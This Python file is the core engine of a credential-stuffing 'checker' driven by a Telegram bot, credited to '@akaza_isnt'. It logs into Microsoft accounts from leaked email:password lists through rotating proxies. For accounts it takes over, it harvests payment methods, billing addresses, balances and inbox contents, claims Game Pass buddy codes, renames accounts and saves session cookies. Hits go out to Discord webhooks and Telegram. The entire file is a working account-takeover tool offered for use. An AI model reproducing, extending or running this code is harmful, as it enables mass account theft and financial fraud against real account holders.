"""
checker_engine.py — Core checking engine with CaptureObject and full module orchestration.
"""
import asyncio
import html
import os
import random
import threading
import time
import zipfile
from dataclasses import dataclass, field
from typing import Optional, List, Tuple

import requests

from proxy_parser import parse_proxy
from login_helper import microsoft_login
import hypixel_stats as hypixel_mod
import balance as balance_mod
import donut_stats as donut_mod
import payment_methods as payment_mod
import rewardpoints as reward_mod
import ban_checker as ban_mod
import email_checker as email_mod
import buddy_pass as buddy_mod
import inbox_scanner as inbox_mod
import cookie_saver as cookie_mod
import auto_ops
import discord_notifier
import subscriptions as subs_mod


def _clone_session(session):
    """Create a new Session with cookies/proxies copied from the original.
    requests.Session is NOT thread-safe, so each capture thread needs its own."""
    s = requests.Session()
    s.cookies.update(session.cookies)
    s.verify = session.verify
    if session.proxies:
        s.proxies = dict(session.proxies)
    s.headers.update(session.headers)
    return s


# ---------------------------------------------------------------------------
# CaptureObject
# ---------------------------------------------------------------------------

@dataclass
class CaptureObject:
    # Core identity
    email: str = ''
    password: str = ''
    name: str = 'N/A'
    capes: str = ''
    uuid: str = ''
    token: str = ''
    type: str = ''
    session: object = field(default=None, repr=False)

    # Hypixel stats (soopy.dev)
    hypixl: Optional[str] = None
    level: Optional[str] = None
    firstlogin: Optional[str] = None
    lastlogin: Optional[str] = None
    bwstars: Optional[str] = None
    swstars: Optional[str] = None
    sbcoins: Optional[str] = None
    sbnetworth: Optional[str] = None
    pitcoins: Optional[str] = None
    sb_lvl: Optional[str] = None
    sb_items: Optional[str] = None

    # Ban status
    banned: Optional[str] = None
    ban_checked: bool = False

    # Optifine cape
    cape: Optional[str] = None

    # Email access
    access: Optional[str] = None

    # Name change
    namechanged: Optional[str] = None
    lastchanged: Optional[str] = None

    # Microsoft financial
    ms_balance: Optional[str] = None
    ms_rewards: Optional[str] = None
    ms_payment_methods: List[str] = field(default_factory=list)
    ms_billing_addresses: List[str] = field(default_factory=list)
    ms_subscriptions: List[str] = field(default_factory=list)

    # DonutSMP stats
    donut_money: Optional[str] = None
    donut_kills: Optional[str] = None
    donut_deaths: Optional[str] = None
    donut_mobs_killed: Optional[str] = None
    donut_playtime: Optional[str] = None
    donut_shards: Optional[str] = None
    donut_broken_blocks: Optional[str] = None
    donut_placed_blocks: Optional[str] = None
    donut_money_made_from_sell: Optional[str] = None
    donut_money_spent_on_shop: Optional[str] = None

    # Inbox matches
    inbox_matches: List[Tuple[str, int]] = field(default_factory=list)

    # Buddy pass codes
    buddy_codes: List[str] = field(default_factory=list)

    def builder(self) -> str:
        """Build a formatted Capture.txt block for this account."""
        sep = '─' * 40
        lines = [
            sep,
            f'  Account: {self.email}:{self.password}',
            f'  Name: {self.name}  |  UUID: {self.uuid or "N/A"}',
            f'  Type: {self.type}  |  Capes: {self.capes or "None"}',
            sep,
        ]

        # Hypixel section
        hypixel_fields = []
        if self.hypixl:       hypixel_fields.append(f'  Rank: {self.hypixl}')
        if self.level:        hypixel_fields.append(f'  Level: {self.level}')
        if self.bwstars:      hypixel_fields.append(f'  Bedwars Stars: {self.bwstars}')
        if self.swstars:      hypixel_fields.append(f'  Skywars Stars: {self.swstars}')
        if self.sbnetworth:   hypixel_fields.append(f'  Skyblock NW: {self.sbnetworth}')
        if self.sbcoins:      hypixel_fields.append(f'  Skyblock Coins: {self.sbcoins}')
        if self.sb_lvl:       hypixel_fields.append(f'  Skyblock Level: {self.sb_lvl}')
        if self.sb_items:     hypixel_fields.append(f'  Skyblock Items: {self.sb_items}')
        if self.pitcoins:     hypixel_fields.append(f'  Pit Gold: {self.pitcoins}')
        if self.firstlogin:   hypixel_fields.append(f'  First Login: {self.firstlogin}')
        if self.lastlogin:    hypixel_fields.append(f'  Last Login: {self.lastlogin}')
        if self.banned is not None:
            hypixel_fields.append(f'  Banned: {self.banned}')
        if hypixel_fields:
            lines.append('  [HYPIXEL]')
            lines.extend(hypixel_fields)

        # Account features
        features = []
        if self.cape:         features.append(f'  Optifine Cape: {self.cape}')
        if self.namechanged:  features.append(f'  Name Change Available: {self.namechanged}')
        if self.lastchanged:  features.append(f'  Last Name Change: {self.lastchanged}')
        if self.access:       features.append(f'  Email Access: {self.access}')
        if features:
            lines.append('  [ACCOUNT]')
            lines.extend(features)

        # Microsoft section
        ms_fields = []
        if self.ms_balance:   ms_fields.append(f'  Balance: {self.ms_balance}')
        if self.ms_rewards:   ms_fields.append(f'  Rewards Points: {self.ms_rewards}')
        if self.ms_payment_methods:
            ms_fields.append(f'  Payment Methods: {", ".join(self.ms_payment_methods)}')
        if self.ms_billing_addresses:
            ms_fields.append(f'  Billing: {"; ".join(self.ms_billing_addresses)}')
        if self.ms_subscriptions:
            ms_fields.append(f'  Subscriptions: {", ".join(self.ms_subscriptions)}')
        if ms_fields:
            lines.append('  [MICROSOFT]')
            lines.extend(ms_fields)

        # DonutSMP section
        donut_fields = []
        if self.donut_money:  donut_fields.append(f'  Money: {self.donut_money}')
        if self.donut_kills:  donut_fields.append(f'  Kills: {self.donut_kills}')
        if self.donut_deaths: donut_fields.append(f'  Deaths: {self.donut_deaths}')
        if self.donut_mobs_killed: donut_fields.append(f'  Mobs Killed: {self.donut_mobs_killed}')
        if self.donut_playtime: donut_fields.append(f'  Playtime: {self.donut_playtime}')
        if self.donut_shards: donut_fields.append(f'  Shards: {self.donut_shards}')
        if self.donut_broken_blocks: donut_fields.append(f'  Broken Blocks: {self.donut_broken_blocks}')
        if self.donut_placed_blocks: donut_fields.append(f'  Placed Blocks: {self.donut_placed_blocks}')
        if self.donut_money_made_from_sell: donut_fields.append(f'  Money From Sell: {self.donut_money_made_from_sell}')
        if self.donut_money_spent_on_shop: donut_fields.append(f'  Money Spent: {self.donut_money_spent_on_shop}')
        if donut_fields:
            lines.append('  [DONUTSMP]')
            lines.extend(donut_fields)

        # Extra captures
        if self.inbox_matches:
            inbox_str = ', '.join(f'{k}({v})' for k, v in self.inbox_matches)
            lines.append(f'  [INBOX] {inbox_str}')
        if self.buddy_codes:
            lines.append(f'  [BUDDY PASS] {", ".join(self.buddy_codes)}')

        lines.append(sep)
        return '\n'.join(lines) + '\n'

    def hits_line(self) -> str:
        """Single-line entry for hits.txt."""
        parts = [f'{self.email}:{self.password}']
        if self.name and self.name != 'N/A':
            parts.append(f'Name: {self.name}')
        parts.append(f'Type: {self.type}')
        if self.capes and self.capes != 'None':
            parts.append(f'Capes: {self.capes}')
        if self.hypixl:     parts.append(f'Hypixel: {self.hypixl}')
        if self.bwstars:    parts.append(f'BW: {self.bwstars}')
        if self.swstars:    parts.append(f'SW: {self.swstars}')
        if self.sbnetworth: parts.append(f'NW: {self.sbnetworth}')
        if self.sb_lvl:     parts.append(f'SB_Lvl: {self.sb_lvl}')
        if self.banned is not None:
            parts.append(f'Banned: {self.banned}')
        if self.cape:       parts.append(f'OF_Cape: {self.cape}')
        if self.access:     parts.append(f'Email: {self.access}')
        if self.ms_balance: parts.append(f'Balance: {self.ms_balance}')
        if self.ms_rewards: parts.append(f'Rewards: {self.ms_rewards}')
        if self.ms_payment_methods:
            parts.append(f'Payments: {len(self.ms_payment_methods)}')
        if self.donut_money: parts.append(f'Donut$: {self.donut_money}')
        if self.buddy_codes:
            parts.append(f'Codes: {len(self.buddy_codes)}')
        if self.inbox_matches:
            parts.append(f'Inbox: {len(self.inbox_matches)}')
        return ' | '.join(parts)


# ---------------------------------------------------------------------------
# CheckerEngine
# ---------------------------------------------------------------------------

class CheckerEngine:
    def __init__(self, user_id, combo_list, proxy_list, threads, settings, db, bot, loop,
                 auto_proxy_pool=None):
        self.user_id = user_id
        self.combo_list = combo_list
        self.proxy_list = [parse_proxy(p) for p in proxy_list if parse_proxy(p)]
        if auto_proxy_pool:
            self.proxy_list = self.proxy_list or auto_proxy_pool
        self.threads = threads
        self.settings = settings
        self.db = db
        self.bot = bot
        self.loop = loop

        # Build config dict from database
        self.config = db.get_user_capture_config(user_id) if db else {}

        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.twofa = 0
        self.valid_mail = 0
        self.checked = 0
        self.total = len(combo_list)
        self.start_time = time.time()
        self.is_running = True

        self.results_dir = f'results/{user_id}_{int(self.start_time)}'
        os.makedirs(self.results_dir, exist_ok=True)
        self.lock = threading.Lock()

        # Rate limiting: target ~200 CPM = ~3.3 accounts/s
        # Delay between accounts per thread ensures we don't exceed this
        target_cpm = 200
        accts_per_sec = target_cpm / 60.0
        self._base_delay = max(0.3, self.threads / accts_per_sec)
        self._per_thread_delay = self._base_delay
        self._rate_lock = threading.Lock()
        self._last_check_time = 0.0
        self._consecutive_429s = 0

    # ---------------------------------------------------------------- helpers

    def get_proxy(self):
        if not self.proxy_list:
            return None
        return random.choice(self.proxy_list)

    def write_dedupe(self, fname: str, filename: str, content: str) -> None:
        """Thread-safe deduplication write. Only appends if content not already present."""
        with self.lock:
            path = os.path.join(self.results_dir, filename)
            os.makedirs(os.path.dirname(path) if os.path.dirname(path) else self.results_dir, exist_ok=True)
            existing = ''
            if os.path.exists(path):
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        existing = f.read()
                except Exception:
                    pass
            if content.strip() not in existing:
                with open(path, 'a', encoding='utf-8', buffering=1) as f:
                    f.write(content)

    def _write_dedupe_wrapper(self, fname_ignored, filename, content):
        """Adapter matching the (fname, filename, content) signature used by sub-modules."""
        self.write_dedupe(self.results_dir, filename, content)

    # ---------------------------------------------------------------- UI

    @staticmethod
    def _fmt_time(seconds):
        if seconds < 60:
            return f'{int(seconds)}s'
        if seconds < 3600:
            return f'{int(seconds // 60)}m {int(seconds % 60)}s'
        return f'{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m'

    async def update_ui(self, msg_obj):
        while self.is_running:
            if self.checked >= self.total > 0:
                break
            elapsed = time.time() - self.start_time
            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            hit_rate = (self.hits / self.checked * 100) if self.checked > 0 else 0
            remaining = self.total - self.checked
            eta = (remaining / (self.checked / elapsed)) if self.checked > 0 and elapsed > 0 else 0
            bar_len = 20
            filled = int(bar_len * progress / 100)
            bar = '█' * filled + '░' * (bar_len - filled)
            text = (
                f'⚡ <b>Checking in Progress</b>\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
                f'<code>[{bar}] {progress:.1f}%</code>\n\n'
                f'<b>Results:</b>\n'
                f'  ┌ 🎯 Hits: <code>{self.hits}</code>\n'
                f'  ├ ❌ Bad: <code>{self.bad}</code>\n'
                f'  ├ 🔐 2FA: <code>{self.twofa}</code>\n'
                f'  ├ 📧 Valid Mail: <code>{self.valid_mail}</code>\n'
                f'  └ ⚠️ Errors: <code>{self.errors}</code>\n\n'
                f'<b>Speed:</b>\n'
                f'  ├ 🔄 Progress: <code>{self.checked}/{self.total}</code>\n'
                f'  ├ ⚡ CPM: <code>{cpm:,}</code>\n'
                f'  ├ 📈 Hit Rate: <code>{hit_rate:.1f}%</code>\n'
                f'  ├ ⏱ Elapsed: <code>{self._fmt_time(elapsed)}</code>\n'
                f'  └ 🏁 ETA: <code>{self._fmt_time(eta)}</code>\n\n'
                f'<i>Credits: @akaza_isnt</i>'
            )
            try:
                await msg_obj.edit_text(text, parse_mode='HTML')
            except Exception:
                pass
            await asyncio.sleep(5)

    # ---------------------------------------------------------------- account check

    def _check_optifine(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('optifinecape', True):
            return
        try:
            r = requests.get(
                f'http://s.optifine.net/capes/{capture_obj.name}.png',
                proxies=self.get_proxy(), verify=False, timeout=10
            )
            capture_obj.cape = 'No' if 'Not found' in r.text else 'Yes'
        except Exception:
            capture_obj.cape = 'Unknown'

    def _check_namechange(self, capture_obj: CaptureObject) -> None:
        self._check_namechange_with(capture_obj, capture_obj.session, capture_obj.token)

    def _check_namechange_with(self, capture_obj: CaptureObject, sess, mc_token: str) -> None:
        if not self.config.get('namechange', True):
            return
        try:
            from datetime import datetime, timezone
            r = sess.get(
                'https://api.minecraftservices.com/minecraft/profile/namechange',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                capture_obj.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                created_at = data.get('createdAt')
                if created_at and self.config.get('lastchanged', True):
                    try:
                        try:
                            dt = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%S.%fZ')
                        except ValueError:
                            dt = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%SZ')
                        dt = dt.replace(tzinfo=timezone.utc)
                        diff = datetime.now(timezone.utc) - dt
                        years = diff.days // 365
                        months = (diff.days % 365) // 30
                        days = diff.days
                        fmt = dt.strftime('%m/%d/%Y')
                        if years > 0:
                            capture_obj.lastchanged = f'{years} year{"s" if years != 1 else ""} - {fmt} - {created_at}'
                        elif months > 0:
                            capture_obj.lastchanged = f'{months} month{"s" if months != 1 else ""} - {fmt} - {created_at}'
                        else:
                            capture_obj.lastchanged = f'{days} day{"s" if days != 1 else ""} - {fmt} - {created_at}'
                    except Exception:
                        pass
        except Exception:
            pass

    def _fetch_hypixel(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('hypixel_stats', True):
            return
        try:
            stats_str = hypixel_mod.fetch_hypixel_stats(capture_obj.name, capture_obj.uuid)
            if stats_str:
                # Parse compact string back into fields
                capture_obj.hypixl = stats_str
                import re
                nw = re.search(r'NW: (\S+)', stats_str)
                if nw: capture_obj.sbnetworth = nw.group(1)
                bw = re.search(r'BW: (\d+)', stats_str)
                if bw: capture_obj.bwstars = bw.group(1)
                sw = re.search(r'SW: (\d+)', stats_str)
                if sw: capture_obj.swstars = sw.group(1)
                pit = re.search(r'Pit_Gold: (\S+)', stats_str)
                if pit: capture_obj.pitcoins = pit.group(1)
                sb_lvl = re.search(r'Sb_Lvl: (\d+)', stats_str)
                if sb_lvl: capture_obj.sb_lvl = sb_lvl.group(1)
                items = re.search(r'Sb_Valuable_Items: (.+)', stats_str)
                if items: capture_obj.sb_items = items.group(1)
        except Exception:
            pass

    def _fetch_donut(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('donut_stats', True):
            return
        try:
            import threading as _t
            result = {}

            def _run():
                try:
                    stats = donut_mod.fetch_donut_stats(
                        capture_obj.name, capture_obj.email, capture_obj.password,
                        capture_obj.banned, self.results_dir, self.lock,
                        self.config, self.get_proxy, 'http',
                        write_dedupe=self._write_dedupe_wrapper
                    )
                    if stats:
                        result.update(stats)
                except Exception:
                    pass

            t = _t.Thread(target=_run, daemon=True)
            t.start()
            t.join(timeout=20)

            if result:
                capture_obj.donut_money = result.get('money')
                capture_obj.donut_kills = result.get('kills')
                capture_obj.donut_deaths = result.get('deaths')
                capture_obj.donut_mobs_killed = result.get('mobs_killed')
                capture_obj.donut_playtime = result.get('playtime')
                capture_obj.donut_shards = result.get('shards')
                capture_obj.donut_broken_blocks = result.get('broken_blocks')
                capture_obj.donut_placed_blocks = result.get('placed_blocks')
                capture_obj.donut_money_made_from_sell = result.get('money_made_from_sell')
                capture_obj.donut_money_spent_on_shop = result.get('money_spent_on_shop')
        except Exception:
            pass

    def check_account(self, combo: str) -> None:
        if ':' not in combo:
            with self.lock:
                self.errors += 1
                self.checked += 1
            return

        email, password = combo.strip().split(':', 1)
        if not email or not password:
            with self.lock:
                self.bad += 1
                self.checked += 1
            return

        max_auth_retries = self.config.get('max_retries', 3)
        token = None
        xbox_token = None

        # ---- Step 1: Microsoft authentication (with retries) ----
        for auth_attempt in range(max_auth_retries):
            session = requests.Session()
            session.verify = False
            session.proxies = self.get_proxy()
            try:
                token, xbox_token = microsoft_login(session, email, password)
                if token == '2FA':
                    self.write_dedupe(self.results_dir, '2fa.txt', f'{email}:{password}\n')
                    discord_notifier.send_2fa_webhook(email, password, self.config)
                    with self.lock:
                        self.twofa += 1
                        self.checked += 1
                    self.db.update_stats(self.user_id, errors=1)
                    session.close()
                    return
                if token:
                    break
                # Auth failed — retry with different proxy
                session.close()
                if auth_attempt < max_auth_retries - 1:
                    time.sleep(1 + auth_attempt)
            except Exception:
                session.close()
                if auth_attempt < max_auth_retries - 1:
                    time.sleep(1 + auth_attempt)
                continue

        if not token:
            self.write_dedupe(self.results_dir, 'bad.txt', f'{email}:{password}\n')
            with self.lock:
                self.bad += 1
                self.checked += 1
            self.db.update_stats(self.user_id, bad=1)
            try:
                session.close()
            except Exception:
                pass
            return

        try:
            # ---- Step 2: Minecraft entitlement check ----
            import minecraft_checker as mc_mod
            capture_obj = CaptureObject(
                email=email, password=password, session=session, token=token
            )
            has_mc = mc_mod.checkmc(
                session, email, password, token, xbox_token,
                self.config, self.proxy_list, self.config.get('max_retries', 3),
                self.get_proxy, self.lock, self.results_dir,
                self._write_dedupe_wrapper, capture_obj,
                discord_notifier.send_xbox_webhook,
                discord_notifier.send_other_webhook,
                engine=self,
            )
            self._report_success()

            if not has_mc:
                # Valid Microsoft account but no MC/XGP entitlement
                self.write_dedupe(self.results_dir, 'Valid_Mail.txt', f'{email}:{password}\n')
                with self.lock:
                    self.valid_mail += 1
                return

            # ---- Step 3: Buddy pass codes (for XGPU/XGP) ----
            if xbox_token and ('Game Pass' in capture_obj.type or 'XGPU' in capture_obj.type):
                try:
                    codes = buddy_mod.claim_buddypass_offers(
                        session, xbox_token, self.results_dir,
                        self._write_dedupe_wrapper, self.config,
                        self.proxy_list, self.get_proxy,
                        self.config.get('max_retries', 3)
                    )
                    capture_obj.buddy_codes = codes
                except Exception:
                    pass

            # ---- Step 4: Parallel capture threads ----
            # requests.Session is NOT thread-safe — clone for each thread
            capture_threads = []
            cloned_sessions = []

            def _add_thread(target, *args):
                t = threading.Thread(target=target, args=args, daemon=True)
                t.start()
                capture_threads.append(t)

            def _make_session():
                cs = _clone_session(session)
                cloned_sessions.append(cs)
                return cs

            _add_thread(self._fetch_hypixel, capture_obj)
            _add_thread(self._check_optifine, capture_obj)

            nc_session = _make_session()
            capture_obj_nc_token = token
            def _namechange_check():
                self._check_namechange_with(capture_obj, nc_session, capture_obj_nc_token)
            _add_thread(_namechange_check)

            if self.config.get('cap_ban_check', True):
                ban_session = _make_session()
                _add_thread(
                    ban_mod.check_hypixel_ban,
                    capture_obj, token, capture_obj.name, capture_obj.uuid,
                    ban_session, [], self.lock, self.results_dir,
                    self._write_dedupe_wrapper, self.lock,
                    self.config.get('max_retries', 3), self.config
                )

            if self.config.get('cap_email_access', True):
                def _email_check():
                    result = email_mod.check_email_access(
                        email, password, self.results_dir,
                        self._write_dedupe_wrapper, self.config
                    )
                    capture_obj.access = result
                _add_thread(_email_check)

            if self.config.get('check_microsoft_balance', False):
                bal_session = _make_session()
                def _balance_check():
                    bal = balance_mod.fetch_balance(
                        bal_session, email, password, self.config,
                        self.results_dir, self._write_dedupe_wrapper
                    )
                    capture_obj.ms_balance = bal
                _add_thread(_balance_check)

            if self.config.get('check_rewards_points', True):
                rwd_session = _make_session()
                def _rewards_check():
                    pts = reward_mod.fetch_rewards(
                        rwd_session, email, password, self.config,
                        self.results_dir, self._write_dedupe_wrapper
                    )
                    capture_obj.ms_rewards = pts
                _add_thread(_rewards_check)

            if self.config.get('check_payment', False):
                pay_session = _make_session()
                def _payment_check():
                    result = payment_mod.fetch_payment_methods(
                        pay_session, email, password, self.config,
                        self.results_dir, self.lock, self._write_dedupe_wrapper
                    )
                    if result.get('instruments'):
                        capture_obj.ms_payment_methods = result['instruments']
                    if result.get('billing_addresses'):
                        capture_obj.ms_billing_addresses = result['billing_addresses']
                _add_thread(_payment_check)

            if self.config.get('cap_subscriptions', False):
                sub_session = _make_session()
                def _subs_check():
                    subs = subs_mod.check_subscriptions(
                        sub_session, email, password,
                        self.results_dir, self._write_dedupe_wrapper, self.config
                    )
                    capture_obj.ms_subscriptions = subs
                _add_thread(_subs_check)

            if self.config.get('donut_stats', True):
                _add_thread(self._fetch_donut, capture_obj)

            if self.config.get('cap_inbox_scan', False):
                inbox_session = _make_session()
                def _inbox_check():
                    keywords_str = self.config.get('inbox_keywords', 'Steam,Netflix,Xbox,Microsoft')
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                    matches = inbox_mod.check_inbox(inbox_session, email, keywords, self.config)
                    capture_obj.inbox_matches = matches
                    if matches:
                        fmt = ', '.join(f'{k}({v})' for k, v in matches)
                        self.write_dedupe(self.results_dir, 'inboxes.txt',
                                          f'{email}:{password} | Inbox: {fmt}\n')
                _add_thread(_inbox_check)

            # Wait for ALL capture threads to finish
            deadline = time.time() + 60
            for t in capture_threads:
                remaining = max(1, deadline - time.time())
                t.join(timeout=remaining)

            # Close cloned sessions
            for cs in cloned_sessions:
                try:
                    cs.close()
                except Exception:
                    pass

            # ---- Step 5: Auto ops ----
            try:
                if self.config.get('cap_auto_name', False) and capture_obj.name != 'N/A':
                    new_name = auto_ops.setname(
                        session, token,
                        self.config.get('auto_name_format', 'Bot_{random_letter}_{random_number}'),
                        self.config.get('max_retries', 3),
                        capture_obj.name
                    )
                    if new_name != capture_obj.name:
                        capture_obj.name = f'{capture_obj.name} -> {new_name}'

                if self.config.get('cap_auto_skin', False):
                    auto_ops.setskin(
                        session, token,
                        self.config.get('auto_skin_url', ''),
                        self.config.get('auto_skin_variant', 'classic'),
                        self.config.get('max_retries', 3)
                    )
            except Exception:
                pass

            # ---- Step 6: Cookie saving ----
            try:
                if self.config.get('cap_save_cookies', False):
                    cookie_mod.save_cookies(session, capture_obj.name, capture_obj.type, self.results_dir)
            except Exception:
                pass

            # ---- Step 7: Write result files ----
            self.write_dedupe(self.results_dir, 'hits.txt', capture_obj.hits_line() + '\n')
            self.write_dedupe(self.results_dir, 'Capture.txt', capture_obj.builder())

            # ---- Step 8: Discord webhook ----
            try:
                discord_notifier.send_hit_webhook(capture_obj, self.config)
            except Exception:
                pass

            # ---- Step 9: Instant Telegram notification ----
            with self.lock:
                self.hits += 1
            self.db.update_stats(self.user_id, hits=1)

            if self.config.get('hit_notifications', True):
                safe_line = html.escape(capture_obj.hits_line())
                msg_text = f'🎯 <b>HIT!</b>\n<code>{safe_line}</code>\n\nCredits: @akaza_isnt'
                uid = self.user_id
                bot_ref = self.bot
                async def _send_hit_notification():
                    try:
                        await bot_ref.send_message(uid, msg_text, parse_mode='HTML')
                    except Exception:
                        try:
                            await bot_ref.send_message(uid, msg_text, parse_mode=None)
                        except Exception:
                            pass
                self.loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(_send_hit_notification())
                )

        except Exception as e:
            self.write_dedupe(self.results_dir, 'errors.txt', f'{email}:{password} ({e})\n')
            with self.lock:
                self.errors += 1
            self.db.update_stats(self.user_id, errors=1)
        finally:
            with self.lock:
                self.checked += 1
            try:
                session.close()
            except Exception:
                pass

    # ---------------------------------------------------------------- workers

    def _report_rate_limit(self):
        """Called when a 429 is encountered — slows down all threads."""
        with self._rate_lock:
            self._consecutive_429s += 1
            self._per_thread_delay = self._base_delay * (1 + self._consecutive_429s * 0.5)

    def _report_success(self):
        """Called on success — gradually restore speed if no more 429s."""
        with self._rate_lock:
            if self._consecutive_429s > 0:
                self._consecutive_429s = max(0, self._consecutive_429s - 1)
                self._per_thread_delay = self._base_delay * (1 + self._consecutive_429s * 0.5)

    def _rate_limit_wait(self):
        """Enforce rate limiting to keep CPM around target (~200)."""
        wait_time = 0
        with self._rate_lock:
            now = time.time()
            min_gap = self._per_thread_delay / max(self.threads, 1)
            elapsed_since_last = now - self._last_check_time
            if elapsed_since_last < min_gap:
                wait_time = min_gap - elapsed_since_last
            # Reserve a unique time slot so the next thread waits past this one
            self._last_check_time = now + wait_time
        if wait_time > 0:
            time.sleep(wait_time)

    def run_worker(self) -> None:
        while self.is_running:
            combo = None
            with self.lock:
                if self.combo_list:
                    combo = self.combo_list.pop(0)
                else:
                    break
            if combo:
                self._rate_limit_wait()
                self.check_account(combo)

    def start(self) -> None:
        thread_count = min(self.threads, max(1, len(self.combo_list)), 20)
        threads_list = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.run_worker, daemon=True)
            t.start()
            threads_list.append(t)
        for t in threads_list:
            t.join()
        self.is_running = False

    def get_results_zip(self) -> str:
        zip_path = f'{self.results_dir}.zip'
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(self.results_dir):
                for fname in files:
                    full_path = os.path.join(root, fname)
                    if os.path.getsize(full_path) > 0:
                        arcname = os.path.relpath(full_path, self.results_dir)
                        zf.write(full_path, arcname)
        return zip_path
